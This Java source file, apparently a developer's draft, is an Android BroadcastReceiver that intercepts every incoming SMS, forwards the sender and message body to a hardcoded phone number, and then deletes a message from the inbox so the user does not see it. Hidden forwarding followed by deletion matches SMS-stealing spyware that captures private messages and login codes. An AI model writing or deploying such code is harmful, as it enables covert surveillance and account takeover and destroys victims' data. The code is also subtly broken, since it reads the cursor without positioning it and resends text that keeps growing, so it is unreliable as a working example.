package roxma.org.sms_forward;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsListener extends BroadcastReceiver {

    public SmsListener() {
    }


    @Override
    public void onReceive(Context context, Intent intent) {

            //Intercept incoming SMS
            SmsManager smsManager = SmsManager.getDefault();
            Bundle myBundle = intent.getExtras();
            SmsMessage[] messages = null;
            String smsMessageStr = "";

            if (myBundle != null) {
                Object[] pdus = (Object[]) myBundle.get("pdus");

                messages = new SmsMessage[pdus.length];

                for (int i = 0; i < messages.length; i++) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        String format = myBundle.getString("format");
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                    } else {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    }


                    //Creating message body for the forward sms
                    smsMessageStr += "SMS from the app: " + messages[i].getOriginatingAddress();
                    smsMessageStr += " : ";
                    smsMessageStr += messages[i].getMessageBody();
                    smsMessageStr += "\n";

                    //Forwarding the Message
                    smsManager.sendTextMessage("+123456", null, smsMessageStr, null, null);


                    //Deleting the last incoming sms in the inbox

                    //!!!!!! The following lines are correct?
                    Uri uriSms = Uri.parse("content://sms/inbox");
                    Cursor c = context.getContentResolver().query(uriSms, new String[]{"_id", "thread_id", "address", "person", "date", "body"}, "read=0", null, null);
                    long id  = c.getLong(0);

                    Uri.Builder builder;
                    builder = Telephony.Sms.CONTENT_URI.buildUpon();
                    builder.appendEncodedPath(String.valueOf(id));
                    Uri uri = builder.build();
                    context.getContentResolver().delete(uri, null, null);
                }

            }
        }
    }